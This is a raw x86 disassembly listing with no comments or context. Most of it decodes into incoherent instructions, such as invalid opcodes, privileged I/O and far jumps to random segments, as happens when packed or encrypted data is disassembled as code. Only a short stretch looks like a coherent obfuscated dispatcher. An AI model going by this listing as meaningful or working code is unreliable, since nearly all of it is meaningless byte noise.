  40fdc7:	or     al,0xdc
  40fdc9:	jmp    esp
  40fdcb:	rol    DWORD PTR [edx+0x5f],0xa5
  40fdcf:	popa   
  40fdd0:	sub    ecx,DWORD PTR [esi+0xc40e73d]
  40fdd6:	pop    ss
  40fdd7:	and    ch,BYTE PTR [eax+0x56]
  40fdda:	inc    esp
  40fddb:	cs dec edi
  40fddd:	int3   
  40fdde:	xor    BYTE PTR [ecx+0x4672b388],dh
  40fde4:	sub    eax,0xaf012c31
  40fde9:	dec    ecx
  40fdea:	xchg   ebp,eax
  40fdeb:	jmp    0x40fdba
  40fded:	aam    0x14
  40fdef:	dec    esi
  40fdf0:	pop    ecx
  40fdf1:	icebp  
  40fdf2:	adc    DWORD PTR [ebp+0x3b],ebx
  40fdf5:	fwait
  40fdf6:	in     eax,dx
  40fdf7:	xchg   ecx,eax
  40fdf8:	cmp    BYTE PTR [edi-0x3cc4257f],al
  40fdfe:	mov    al,0x22
  40fe00:	(bad)  
  40fe01:	push   edi
  40fe02:	dec    edi
  40fe03:	rep lods al,BYTE PTR ds:[esi]
  40fe05:	and    dl,BYTE PTR [esi+0x15]
  40fe08:	fisub  DWORD PTR [edx+0x57ba4361]
  40fe0e:	pop    ebx
  40fe0f:	jnp    0x40fe6b
  40fe11:	mov    dl,0xa
  40fe13:	mov    DWORD PTR [ebp+0x258ebb2a],ebp
  40fe19:	fistp  WORD PTR [eax-0x6cba8d25]
  40fe1f:	pop    ss
  40fe20:	inc    ebp
  40fe21:	inc    esp
  40fe22:	daa    
  40fe23:	xchg   ah,bh
  40fe25:	adc    BYTE PTR [ebx+0x31f7def0],dh
  40fe2b:	jmp    0x40fe45
  40fe2d:	aaa    
  40fe2e:	icebp  
  40fe2f:	sub    al,0xa3
  40fe31:	sbb    bh,BYTE PTR [ecx+ecx*8]
  40fe34:	in     eax,0x9e
  40fe36:	mov    ds:0x32626a7f,al
  40fe3b:	push   edx
  40fe3c:	lahf   
  40fe3d:	inc    ebp
  40fe3e:	inc    edx
  40fe3f:	sbb    BYTE PTR [esi],0x78
  40fe42:	pop    ds
  40fe43:	or     eax,0x448e531f
  40fe48:	mov    ds:0xf863eb32,eax
  40fe4d:	mov    ebp,0x3622989b
  40fe52:	mov    al,ds:0x2f4dbac3
  40fe57:	ins    DWORD PTR es:[edi],dx
  40fe58:	pop    ecx
  40fe59:	enter  0x6636,0xf2
  40fe5d:	clc    
  40fe5e:	mov    edi,0x7ba66132
  40fe63:	pop    ebx
  40fe64:	fadd   st,st(4)
  40fe66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe67:	sti    
  40fe68:	es in  al,0x8e
  40fe6b:	pop    edi
  40fe6c:	mov    WORD PTR [eax-0x65],gs
  40fe6f:	nop
  40fe70:	(bad)  
  40fe71:	ins    DWORD PTR es:[edi],dx
  40fe72:	cmp    eax,0xe3bc2628
  40fe77:	push   eax
  40fe78:	push   esi
  40fe79:	jae    0x40fe05
  40fe7b:	jbe    0x40fe8c
  40fe7d:	stos   DWORD PTR es:[edi],eax
  40fe7e:	mov    esi,DWORD PTR [esi]
  40fe80:	mov    ds:0xa4c1a126,eax
  40fe85:	cmp    dl,BYTE PTR [edx-0x3f]
  40fe88:	add    ch,BYTE PTR [ecx]
  40fe8a:	adc    BYTE PTR [edx-0x6e8f6de6],cl
  40fe90:	jle    0x40fe7b
  40fe92:	in     al,0x6d
  40fe94:	jo     0x40ff08
  40fe96:	mov    esp,0xbb0cb850
  40fe9b:	jne    0x40feab
  40fe9d:	retf   0x52f8
  40fea0:	sub    al,0x33
  40fea2:	gs hlt 
  40fea4:	xor    al,0xaf
  40fea6:	mov    dl,0x0
  40fea8:	mov    esi,0xad20b098
  40fead:	and    cl,BYTE PTR [eax-0x4f4fec4a]
  40feb3:	dec    ecx
  40feb4:	ss or  eax,ecx
  40feb7:	add    dl,BYTE PTR [edx]
  40feb9:	ja     0x40fef9
  40febb:	out    dx,eax
  40febc:	clc    
  40febd:	or     DWORD PTR [edx-0x25],0x2c61740c
  40fec4:	jl     0x40ff28
  40fec6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fec7:	int3   
  40fec8:	or     al,0xd0
  40feca:	(bad)  
  40fecb:	adc    DWORD PTR [esp+eiz*4+0xcf40975],esi
  40fed2:	test   edx,ebp
  40fed4:	lods   eax,DWORD PTR ds:[esi]
  40fed5:	add    BYTE PTR [esi-0x6b],cl
  40fed8:	in     al,0xf6
  40feda:	dec    eax
  40fedb:	pop    ds
  40fedc:	push   ds
  40fedd:	push   ebp
  40fede:	inc    ebx
  40fedf:	fidivr WORD PTR [esi+0x1ef6ab08]
  40fee5:	enter  0x47d0,0x19
  40fee9:	and    bh,dh
  40feeb:	imul   DWORD PTR [esi]
  40feed:	cwde   
  40feee:	sub    dh,al
  40fef0:	or     cl,BYTE PTR [eax-0x43554a32]
  40fef6:	jo     0x40feff
  40fef8:	mov    dl,0x72
  40fefa:	(bad)  
  40fefb:	pushf  
  40fefc:	out    dx,al
  40fefd:	adc    al,0xa
  40feff:	(bad)
  40ff02:	inc    esp
  40ff03:	iret   
  40ff04:	inc    edx
  40ff05:	popa   
  40ff06:	inc    edi
  40ff07:	outs   dx,DWORD PTR ds:[esi]
  40ff08:	mov    cl,0x2c
  40ff0a:	ss not BYTE PTR fs:[eax]
  40ff0e:	mov    esp,0xb4fa08d0
  40ff13:	jno    0x40ff00
  40ff15:	push   edx
  40ff16:	sub    eax,0x5b839153
  40ff1b:	data16 stc 
  40ff1d:	test   eax,0x305486c
  40ff22:	inc    edi
  40ff23:	inc    esp
  40ff24:	out    0x1f,al
  40ff26:	sahf   
  40ff27:	mov    eax,0xe7e89e6f
  40ff2c:	sub    ebp,DWORD PTR [eax]
  40ff2e:	sar    edx,0x17
  40ff31:	(bad)  
  40ff33:	test   edx,esp
  40ff35:	mov    esp,0x8473e66c
  40ff3a:	sbb    eax,0xc6cd87f2
  40ff3f:	push   0x36
  40ff41:	nop
  40ff42:	inc    esi
  40ff43:	xor    dl,BYTE PTR [esi]
  40ff45:	mov    al,ds:0xb5116c63
  40ff4a:	imul   esp,DWORD PTR [edi+0xa6db36c],0xb
  40ff51:	outs   dx,BYTE PTR ds:[esi]
  40ff52:	jge    0x40ff07
  40ff54:	fmul   QWORD PTR [eax+0x6]
  40ff57:	pushf  
  40ff58:	fst    QWORD PTR [eax+edx*8]
  40ff5b:	mov    al,0xc
  40ff5d:	outs   dx,DWORD PTR ds:[esi]
  40ff5e:	mov    BYTE PTR [ebp-0x2f],cl
  40ff61:	imul   ebx,edx,0x33
  40ff64:	ins    BYTE PTR es:[edi],dx
  40ff65:	pop    esi
  40ff66:	test   ch,ch
  40ff68:	scas   al,BYTE PTR es:[edi]
  40ff69:	dec    edx
  40ff6a:	mov    edx,0x96c9b482
  40ff6f:	jno    0x40ff84
  40ff71:	add    BYTE PTR ds:0xe26ab5bb,0xcb
  40ff78:	call   0x2cb05485
  40ff7d:	icebp  
  40ff7e:	rcr    ah,0x3e
  40ff81:	imul   ebp,DWORD PTR [eax],0x72
  40ff84:	es pop esp
  40ff86:	lea    eax,[ecx-0x3e]
  40ff89:	clc    
  40ff8a:	cmp    BYTE PTR [edi],bh
  40ff8c:	sahf   
  40ff8d:	scas   al,BYTE PTR es:[edi]
  40ff8e:	enter  0xfe33,0xf9
  40ff92:	push   ebp
  40ff93:	push   es
  40ff94:	xchg   esp,ecx
  40ff96:	dec    edx
  40ff97:	and    edx,DWORD PTR [edi-0x1e]
  40ff9a:	mov    ds:0x201f534,al
  40ff9f:	retf   0x6cdd
  40ffa2:	int3   
  40ffa3:	and    BYTE PTR [edi+0x2dd60b08],0xc7
  40ffaa:	sub    bh,ch
  40ffac:	outs   dx,BYTE PTR ds:[esi]
  40ffad:	cmp    DWORD PTR [ebp-0x3d],ebp
  40ffb0:	inc    bl
  40ffb2:	fnsave [edx-0x6b323fbc]
  40ffb8:	inc    esp
  40ffb9:	push   ds
  40ffba:	mov    bh,0xb7
  40ffbc:	(bad)
  40ffc0:	jl     0x410009
  40ffc2:	(bad)  
  40ffc3:	jo     0x40ff99
  40ffc5:	cmp    BYTE PTR [eax],0xd
  40ffc8:	push   ebp
  40ffc9:	mov    WORD PTR [edx-0x736c2c71],es
  40ffcf:	mov    edi,0xd8ad66f5
  40ffd4:	in     eax,0x41
  40ffd6:	mov    eax,ds:0x66ae56c1
  40ffdb:	push   edx
  40ffdc:	int3   
  40ffdd:	inc    ebp
  40ffde:	cld    
  40ffdf:	vmulpd ymm3,ymm4,YMMWORD PTR [eax-0x7b]
  40ffe4:	add    esi,edi
  40ffe6:	adc    al,0x34
  40ffe8:	sbb    eax,0x5f37853a
  40ffed:	mov    ds:0x89cb7ae9,eax
  40fff2:	idiv   DWORD PTR [edx-0x62]
  40fff5:	imul   ebx,DWORD PTR [ecx],0x70cf0ed6
  40fffb:	push   ss
  40fffc:	inc    edi
  40fffd:	sti    
  40fffe:	lds    esi,FWORD PTR [edx+0x60]
  410001:	imul   ebp,DWORD PTR [eax+0x94a1404],0x7cc5ee7d
  41000b:	jge    0x41001f
  41000d:	jecxz  0x410016
  41000f:	add    eax,0xebba2629
  410014:	loope  0x40ffc1
  410016:	jl     0x410007
  410018:	idiv   DWORD PTR ds:0x32f95653
  41001e:	(bad)  
  41001f:	int    0xa9
  410021:	int    0x59
  410023:	retf   0x4dab
  410026:	hlt    
  410027:	xor    ah,BYTE PTR [ecx+0x145ce543]
  41002d:	mov    ecx,0xe06e072f
  410032:	mov    ebx,DWORD PTR [ebp-0x10]
  410035:	sub    ebx,edi
  410037:	cmp    ebx,edx
  410039:	ja     0x41004b
  41003f:	mov    edx,DWORD PTR [ebp-0x4]
  410042:	xor    edx,eax
  410044:	add    edx,ecx
  410046:	jmp    0x41220c
  41004b:	mov    edx,DWORD PTR [ebp-0x2c]
  41004e:	mov    edi,DWORD PTR [ebp-0x4]
  410051:	xor    edx,eax
  410053:	xor    edi,eax
  410055:	add    edi,ecx
  410057:	jmp    0x4102df
  41005c:	sar    DWORD PTR [eax+edx*8],cl
  41005f:	int    0xd7
  410061:	(bad)  
  410063:	ret    0x69c5
  410066:	xchg   ebx,eax
  410067:	daa    
  410068:	out    dx,al
  410069:	loop   0x4100e9
  41006b:	and    esp,edi
  41006d:	dec    eax
  41006e:	js     0x4100e8
  410070:	in     eax,0x7e
  410072:	js     0x4100ec
  410074:	jnp    0x4100db
  410076:	push   cs
  410077:	hlt    
  410078:	(bad)  
  410079:	cli    
  41007a:	push   ecx
  41007b:	in     al,dx
  41007c:	and    al,0xc3
  41007e:	xor    ebp,DWORD PTR [esi]
  410080:	stc    
  410081:	and    eax,0xa82ad452
  410086:	inc    edx
  410087:	dec    ecx
  410088:	pop    esi
  410089:	xor    bh,BYTE PTR [edi+0x73ae41ec]
  41008f:	lahf   
  410090:	xor    BYTE PTR [ecx],bl
  410092:	imul   eax,DWORD PTR [ebx-0x59],0x1f4f8b56
  410099:	inc    edx
  41009a:	fisttp WORD PTR [esi*2-0x4a901e1e]
  4100a1:	sbb    dl,BYTE PTR [eax-0x74]
  4100a4:	es and ebx,edx
  4100a7:	mov    ebx,0xf2dec7c9
  4100ac:	cwde   
  4100ad:	loop   0x4100c8
  4100af:	test   al,0x31
  4100b1:	int    0xcb
  4100b3:	or     bl,bl
  4100b5:	mov    ebx,0x9190bd38
  4100ba:	ds sub edx,esi
  4100bd:	(bad)
  4100c0:	lahf   
  4100c1:	aad    0x7b
  4100c3:	daa    
  4100c4:	ins    DWORD PTR es:[edi],dx
  4100c5:	jb     0x4100be
  4100c7:	mov    dh,0x1d
  4100c9:	pop    ds
  4100ca:	retf   
  4100cb:	inc    esp
  4100cc:	add    DWORD PTR [esi-0x38],ebp
  4100cf:	mov    edx,DWORD PTR [eax-0x55bd270b]
  4100d5:	push   ds
  4100d6:	mov    esp,DWORD PTR [ebp+0x3d6d8051]
  4100dc:	push   0x1e
  4100de:	test   cl,dl
  4100e0:	dec    edi
  4100e1:	cmc    
  4100e2:	adc    eax,DWORD PTR [ecx]
  4100e4:	dec    esi
  4100e5:	ret    
  4100e6:	jmp    0x6d4b:0x6aa805cf
  4100ed:	inc    edx
  4100ee:	rcl    DWORD PTR [eax+eiz*4],1
  4100f1:	adc    DWORD PTR [edx+0x772da974],eax
  4100f7:	cwde   
  4100f8:	mov    ebp,0xfe6df457
  4100fd:	xchg   esp,eax
  4100fe:	cmp    dh,BYTE PTR [ebx]
  410100:	call   0xd358:0xc91cd8b1
  410107:	adc    al,0x8e
  410109:	dec    eax
  41010a:	cli    
  41010b:	jnp    0xe4e36f9f
  410111:	cmc    
  410112:	(bad)  
  410113:	das    
  410114:	mov    edi,0x3c69abb7
  410119:	addr16 push ecx
  41011b:	mov    ah,0xd8
  41011d:	mov    WORD PTR [edx-0x2c],ds
  410120:	sub    ecx,DWORD PTR [edx+eax*2-0x21]
  410124:	js     0x41011e
  410126:	pop    ss
  410127:	sub    DWORD PTR [esi+ecx*4+0x438d42e9],edx
  41012e:	xchg   ebp,eax
  41012f:	push   eax
  410130:	cli    
  410131:	sub    cl,bl
  410133:	int3   
  410134:	in     eax,dx
  410135:	push   edx
  410136:	push   esi
  410137:	jle    0x410101
  410139:	mov    dl,0x36
  41013b:	scas   al,BYTE PTR es:[edi]
  41013c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41013d:	and    bl,BYTE PTR [ebp-0x2a]
  410140:	rcr    BYTE PTR [ecx],1
  410142:	xor    al,0x68
  410144:	dec    esp
  410145:	aad    0xf0
  410147:	popa   
  410148:	std    
  410149:	mov    bl,0x5
  41014b:	inc    ecx
  41014c:	cld    
  41014d:	mov    ds:0x558cc7a0,eax
  410152:	push   0x75
  410154:	jmp    0x6658:0x81035109
  41015b:	fs inc ebp
  41015d:	loop   0x4100e2
  41015f:	cld    
  410160:	and    DWORD PTR [edx-0x1b0a947],eax
  410166:	nop
  410167:	cwde   
  410168:	aaa    
  410169:	iret   
  41016a:	dec    edx
  41016b:	adc    DWORD PTR [eax-0x6c],0xffffffba
  41016f:	xchg   ebp,eax
  410171:	xor    BYTE PTR [eax],dh
  410173:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410174:	stos   DWORD PTR es:[edi],eax
  410175:	xchg   ebx,eax
  410176:	pushf  
  410177:	mov    dh,0x2b
  410179:	bswap  ecx
  41017b:	xor    DWORD PTR [esp+edx*2+0x2e],ebp
  41017f:	and    eax,0x3e58aa68
  410184:	mov    eax,ds:0xa8ab5fcb
  410189:	scas   al,BYTE PTR es:[edi]
  41018a:	and    eax,0x61e84449
  41018f:	or     BYTE PTR [ebx+0x399f999],0x2f
  410196:	fistp  DWORD PTR [esi+0x760b57ef]
  41019c:	ins    BYTE PTR es:[edi],dx
  41019d:	ret    
  41019e:	xor    eax,0x10e0d1ec
  4101a3:	add    al,0xa2
  4101a5:	xchg   ebx,eax
  4101a6:	stc    
  4101a7:	es xchg ecx,eax
  4101a9:	mov    ecx,0xde96d4a0
  4101ae:	mov    esi,DWORD PTR [eax]
  4101b0:	mov    al,ds:0x65a26a4d
  4101b5:	xchg   esp,eax
  4101b6:	out    0x76,al
  4101b8:	adc    DWORD PTR [ebp-0xd],ebp
  4101bb:	aas    
  4101bc:	test   al,0xca
  4101be:	retf   0x6c3
  4101c1:	(bad)  
  4101c2:	xchg   edx,eax
  4101c3:	mov    dh,0x6f
  4101c5:	lea    edx,[ebp-0x1e]
  4101c8:	inc    ecx
  4101c9:	mov    ecx,0x393bc019
  4101ce:	test   DWORD PTR [esp+edx*1],edi
  4101d1:	mov    ds,esi
  4101d3:	dec    edi
  4101d4:	in     eax,dx
  4101d5:	adc    BYTE PTR [ecx],dh
  4101d7:	mov    edx,0x4c5e81c6
  4101dc:	ret    
  4101dd:	shr    DWORD PTR [ebx-0x7a063495],1
  4101e3:	ins    BYTE PTR es:[edi],dx
  4101e4:	push   edi
  4101e5:	push   edi
  4101e6:	inc    esp
  4101e7:	(bad)  
  4101e9:	aam    0x22
  4101eb:	inc    eax
  4101ec:	shl    eax,0x40
  4101ef:	push   edi
  4101f0:	dec    eax
  4101f1:	push   eax
  4101f2:	sbb    DWORD PTR [ecx+0x5f],ebp
  4101f5:	in     al,0x76
  4101f7:	int3   
  4101f8:	sub    al,0xee
  4101fa:	aaa    
  4101fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101fc:	enter  0xa857,0xe5
  410200:	sahf   
  410201:	fstp   st(0)
  410203:	rcl    DWORD PTR [edi],1
  410205:	mov    eax,0xa688f044
  41020a:	pop    esi
  41020b:	push   eax
  41020c:	jmp    0x410278
  41020e:	sbb    BYTE PTR [ecx-0x30e9d2],bh
  410214:	push   ds
  410215:	fmul   DWORD PTR [ebx+0x26]
  410218:	dec    ebp
  410219:	fild   WORD PTR [ecx-0x1c]
  41021c:	inc    esi
  41021d:	sti    
  41021e:	push   esp
  41021f:	mov    ds:0xc8350a8d,al
  410224:	push   0xbc99823c
  410229:	inc    edi
  41022a:	cmc    
  41022b:	imul   ebx,edx,0x8b18e2e0
  410231:	in     eax,0xa4
  410233:	mov    edi,0xc5dacb53
  410238:	ficom  DWORD PTR [eax+0x13]
  41023b:	and    eax,0x8c673592
  410240:	mov    al,ds:0x298a90f1
  410245:	scas   eax,DWORD PTR es:[edi]
  410246:	mov    bh,0xa2
  410248:	pop    edi
  410249:	and    esp,DWORD PTR [eax+0x2f]
  41024c:	fmul   st,st(3)
  41024e:	outs   dx,BYTE PTR ds:[esi]
  41024f:	lods   al,BYTE PTR ds:[esi]
  410250:	cdq    
  410251:	mov    al,0xbb
  410253:	div    esp
  410255:	inc    edx
  410256:	mov    bh,0x58
  410258:	aad    0xaf
  41025a:	js     0x4101f6
  41025c:	into   
  41025d:	jno    0x410293
  41025f:	out    dx,eax
  410260:	(bad)  
  410262:	icebp  
  410263:	push   esp
  410264:	mov    cl,0x79
  410266:	hlt    
  410267:	inc    eax
  410268:	outs   dx,BYTE PTR ds:[esi]
  410269:	pop    ebp
  41026a:	test   ch,ch
  41026c:	in     eax,0xe0
  41026e:	mov    ebx,0x286f63ab
  410273:	xor    bh,BYTE PTR [esi+0x3cf9405e]
  410279:	push   ds
  41027a:	inc    esp
  41027b:	(bad)  
  41027d:	jge    0x4102b2
  41027f:	push   0x31e67922
  410284:	out    dx,eax
  410285:	das    
  410286:	or     ch,al
  410288:	scas   eax,DWORD PTR es:[edi]
  410289:	dec    ebp
  41028a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41028b:	iret   
  41028c:	mov    cl,BYTE PTR [ebx-0x67]
  41028f:	adc    DWORD PTR [edx+0x64],eax
  410292:	mov    bh,0xd3
  410294:	inc    esi
  410295:	mov    edx,0x47d740d3
  41029a:	sbb    BYTE PTR fs:[ebp+0x77],dh
  41029e:	into   
  41029f:	mov    DWORD PTR [edi-0x442bb337],ebp
  4102a5:	fs clc 
  4102a7:	sub    DWORD PTR [edi],ebx
  4102a9:	mov    ah,0x1f
  4102ab:	or     eax,0xc63e77c5
  4102b0:	call   0xc412:0x18eb3064
  4102b7:	xor    al,BYTE PTR [ecx-0x5a]
  4102ba:	pop    ss
  4102bb:	mov    cs,WORD PTR [ebp+0xec635d5]
  4102c1:	push   0x80f03538
  4102c6:	cmp    ebp,DWORD PTR [ecx]
  4102c8:	add    ebp,edx
  4102ca:	mov    edx,0x18da9380
  4102cf:	ret    
  4102d0:	(bad)  
  4102d1:	leave  
  4102d2:	jb     0x410326
  4102d4:	jg     0x410344
  4102d6:	stos   DWORD PTR es:[edi],eax
  4102d7:	mov    edx,0x453f0e5b
  4102dc:	xchg   edi,eax
  4102dd:	(bad)  
  4102df:	add    edx,ecx
  4102e1:	jmp    0x410569
  4102e6:	ret    
  4102e7:	int    0xc7
  4102e9:	into   
  4102ea:	(bad)  
  4102ec:	(bad)  
  4102ee:	xchg   BYTE PTR [edi],dh
  4102f0:	jle    0x410290
  4102f2:	ss xchg esi,eax
  4102f4:	das    
  4102f5:	mov    edi,0x78784e4c
  4102fa:	in     eax,0x7e
  4102fc:	js     0x410376
  4102fe:	push   ecx
  4102ff:	sub    esi,DWORD PTR [esi+0x60]
  410302:	adc    eax,0xa8d55057
  410307:	mov    dl,0x8a
  410309:	jmp    0x410322
  41030b:	test   eax,0xae7c42fb
  410310:	mov    ecx,0xebfa991f
  410315:	dec    esp
  410316:	gs and eax,0xc336ddc9
  41031c:	sub    bh,BYTE PTR [ecx+0x19]
  41031f:	xlat   BYTE PTR ds:[ebx]
  410320:	loopne 0x410361
  410322:	fadd   QWORD PTR [ecx+0x5978ee01]
  410328:	and    BYTE PTR [ecx+esi*8-0x24332b09],dl
  41032f:	dec    ebx
  410330:	or     bh,bh
  410332:	sub    esi,ebp
  410334:	pusha  
  410335:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410336:	les    ecx,FWORD PTR [ebp+0x673efb2e]
  41033c:	dec    ebp
  41033d:	sbb    al,0x8f
  41033f:	pop    ds
  410340:	leave  
  410341:	ins    DWORD PTR es:[edi],dx
  410342:	jno    0x4102de
  410344:	pop    es
  410345:	sub    al,0x62
  410347:	pop    esi
  410348:	in     al,dx
  410349:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41034a:	pusha  
  41034b:	add    DWORD PTR [edi+0x10b3d6c7],esp
  410351:	aas    
  410352:	cmp    BYTE PTR [esi-0x61],bh
  410355:	and    cl,BYTE PTR [ebx]
  410357:	jl     0x410343
  410359:	jns    0x41032f
  41035b:	xor    bl,BYTE PTR ds:0xbf9c1b61
  410361:	xor    ebx,DWORD PTR [esi]
  410363:	jmp    0xd2e6:0xd57f9166
  41036a:	jmp    0x17cb:0xb1281e28
  410371:	hlt    
  410372:	mov    ch,0x27
  410374:	mov    bl,0xd9
  410376:	mov    esp,0x3579632c
  41037b:	repz loopne 0x41036f
  41037e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41037f:	sub    ecx,DWORD PTR [esi]
  410381:	pop    edi
  410382:	mov    dh,0xf0
  410384:	or     al,0x3b
  410386:	add    DWORD PTR [edi],edx
  410388:	ret    
  410389:	sub    eax,0xe85fafc9
  41038e:	mov    bl,0xc5
  410390:	outs   dx,BYTE PTR ds:[esi]
  410391:	mov    ah,BYTE PTR [esi]
  410393:	inc    edx
  410394:	hlt    
  410395:	aaa    
  410396:	pop    eax
  410397:	sbb    bh,BYTE PTR [edx+eiz*2+0x78]
  41039b:	mov    dh,0xab
  41039d:	hlt    
  41039e:	cmp    al,0x1e
  4103a0:	das    
  4103a1:	adc    BYTE PTR [esi],al
  4103a3:	add    al,0x4e
  4103a5:	push   0x57
  4103a7:	popa   
  4103a8:	pushf  
  4103a9:	sahf   
  4103aa:	outs   dx,DWORD PTR ds:[esi]
  4103ab:	hlt    
  4103ac:	in     eax,dx
  4103ad:	xchg   BYTE PTR [edx+0x15ced847],ah
  4103b3:	inc    edi
  4103b4:	call   0xf927b95d
  4103b9:	(bad)  
  4103ba:	daa    
  4103bb:	cli    
  4103bc:	push   ecx
  4103bd:	lods   al,BYTE PTR ds:[esi]
  4103be:	inc    ecx
  4103bf:	xchg   edx,eax
  4103c0:	inc    ebx
  4103c1:	sub    DWORD PTR [ebx-0x7e1520da],edi
  4103c7:	outs   dx,BYTE PTR ds:[esi]
  4103c8:	fild   QWORD PTR ds:0x16089717
  4103ce:	cli    
  4103cf:	inc    ebp
  4103d0:	adc    ebp,0x7e
  4103d3:	leave  
  4103d4:	sti    
  4103d5:	pop    ss
  4103d6:	push   ebp
  4103d7:	add    DWORD PTR [eax+0x4],edx
  4103da:	out    0x8e,eax
  4103dc:	and    al,0x3
  4103de:	xor    al,0x7
  4103e0:	(bad)  
  4103e1:	mov    al,BYTE PTR [edx-0x63]
  4103e4:	or     al,0x19
  4103e6:	or     bl,BYTE PTR [ecx-0x35]
  4103e9:	push   ds
  4103ea:	in     eax,dx
  4103eb:	(bad)  
  4103ed:	iret   
  4103ee:	jmp    0xdef6:0x42ea1ee
  4103f5:	push   es
  4103f6:	and    BYTE PTR [ebp+0x64ab4ef5],dl
  4103fc:	arpl   WORD PTR [edi],cx
  4103fe:	and    al,0x1a
  410400:	mov    bl,0x63
  410402:	add    edx,DWORD PTR [edi+ebp*1+0x58]
  410406:	dec    esp
  410407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410408:	scas   eax,DWORD PTR es:[edi]
  410409:	ret    
  41040a:	lods   eax,DWORD PTR ds:[esi]
  41040b:	jl     0x410411
  41040d:	cwde   
  41040e:	adc    eax,0x6bf15830
  410413:	mov    edi,0x10307150
  410418:	xor    al,0x5c
  41041a:	mov    BYTE PTR [edi],ch
  41041c:	push   edx
  41041d:	leave  
  41041e:	cmp    BYTE PTR [edi+0x24],dh
  410421:	fisttp QWORD PTR [edx+0x4a]
  410424:	jbe    0x410420
  410426:	xchg   ebx,eax
  410427:	pop    ecx
  410428:	mov    al,0x79
  41042a:	inc    ebp
  41042b:	lahf   
  41042c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41042d:	scas   eax,DWORD PTR es:[edi]
  41042e:	sbb    dl,cl
  410430:	mov    ebx,0xef8ea239
  410435:	(bad)  
  410437:	sub    eax,0x394d1056
  41043c:	mov    bl,0x45
  41043e:	jns    0x410406
  410440:	ud2    
  410442:	mov    al,ds:0xd0b933fb
  410447:	sbb    BYTE PTR [eax-0x6a4e69eb],dh
  41044d:	jmp    0xc3e809a7
  410452:	(bad)  
  410453:	adc    cl,BYTE PTR [esi-0xd865e90]
  410459:	call   0xe8dc833d
  41045e:	sub    eax,0x642b6744
  410463:	or     eax,0x2364560c
  410468:	jmp    0x622797b8
  41046d:	and    edx,ebx
  41046f:	vmread esp,esp
  410472:	dec    esi
  410473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410474:	xor    al,0x89
  410476:	lahf   
  410477:	inc    ecx
  410478:	push   cs
  410479:	enter  0x9b60,0x94
  41047d:	add    ch,ah
  41047f:	xor    esi,DWORD PTR [ecx-0x46]
  410482:	mov    eax,ds:0xf34c7b89
  410487:	js     0x410487
  410489:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41048a:	jmp    0x4104b3
  41048c:	push   es
  41048d:	pushf  
  41048e:	mov    ds:0x7e1645d2,eax
  410493:	inc    esp
  410494:	and    al,0x41
  410496:	jno    0x41043c
  410498:	fcmovu st,st(1)
  41049a:	jb     0x41045b
  41049c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41049d:	jl     0x41050d
  41049f:	ja     0x4104d4
  4104a1:	inc    esp
  4104a2:	push   edi
  4104a3:	jecxz  0x410480
  4104a5:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4104a7:	and    eax,0xac605fb1
  4104ac:	pop    ss
  4104ad:	add    DWORD PTR ds:0xfa80456f,edi
  4104b3:	lods   al,BYTE PTR ds:[esi]
  4104b4:	jnp    0x41050f
  4104b6:	les    eax,FWORD PTR [ebx-0x46]
  4104b9:	loope  0x41045b
  4104bb:	or     DWORD PTR [ecx],ecx
  4104bd:	mul    ebp
  4104bf:	mov    ds:0xc63f4e57,al
  4104c4:	mov    al,ds:0xaffbe63d
  4104c9:	es popa 
  4104cb:	sub    cl,BYTE PTR [ebx]
  4104cd:	outs   dx,DWORD PTR ds:[esi]
  4104ce:	adc    BYTE PTR [esi],bl
  4104d0:	dec    edx
  4104d1:	adc    al,0x6
  4104d3:	into   
  4104d4:	sbb    al,bl
  4104d6:	into   
  4104d7:	jne    0x410478
  4104d9:	jecxz  0x4104a7
  4104db:	dec    esi
  4104dc:	push   0x13
  4104de:	repnz xchg edi,eax
  4104e0:	ja     0x4104d9
  4104e2:	and    cl,cl
  4104e4:	ror    BYTE PTR [ecx],cl
  4104e6:	xor    al,BYTE PTR [eax-0x7e]
  4104e9:	pop    edx
  4104ea:	pushaw 
  4104ec:	sbb    BYTE PTR [ebx],ah
  4104ee:	pop    edx
  4104ef:	push   es
  4104f0:	add    eax,0x80657a94
  4104f5:	or     bl,dl
  4104f7:	not    BYTE PTR [ebx+0x1d39789]
  4104fd:	pop    esi
  4104fe:	dec    edx
  4104ff:	lods   eax,DWORD PTR ds:[esi]
  410500:	imul   edx,DWORD PTR ds:0x3640c624,0x831d9baa
  41050a:	jecxz  0x4104ae
  41050c:	je     0x410556
  41050e:	jo     0x41054c
  410510:	push   esp
  410511:	sbb    ebp,DWORD PTR [ebx+0x5d]
  410514:	sbb    eax,0x808a4921
  410519:	jg     0x410547
  41051b:	cmp    al,bl
  41051d:	push   cs
  41051e:	imul   esp,DWORD PTR [ecx+0x3119a35a],0x5fd5a761
  410528:	cli    
  410529:	lods   al,BYTE PTR ds:[esi]
  41052a:	cmc    
  41052b:	push   es
  41052c:	je     0x4104c0
  41052e:	and    al,0xb0
  410530:	mov    dl,0x97
  410532:	std    
  410533:	stc    
  410534:	xor    DWORD PTR [esp+eax*4],0xfffffff2
  410538:	dec    ebp
  410539:	out    dx,eax
  41053a:	cmp    BYTE PTR [edx+0x5367f63e],ah
  410540:	mov    ds:0xe1fac526,al
  410545:	popa   
  410546:	sub    ebp,DWORD PTR [esi+0x5d]
  410549:	shl    DWORD PTR [edi-0xc5756f1],cl
  41054f:	add    DWORD PTR [esi],esi
  410551:	out    0x10,eax
  410553:	adc    eax,0x48f60528
  410558:	mov    al,0x83
  41055a:	mov    esi,0x5ef3979d
  41055f:	aas    
  410560:	test   eax,0xb1762cda
  410565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410566:	jge    0x410541
  410568:	jo     0x410579
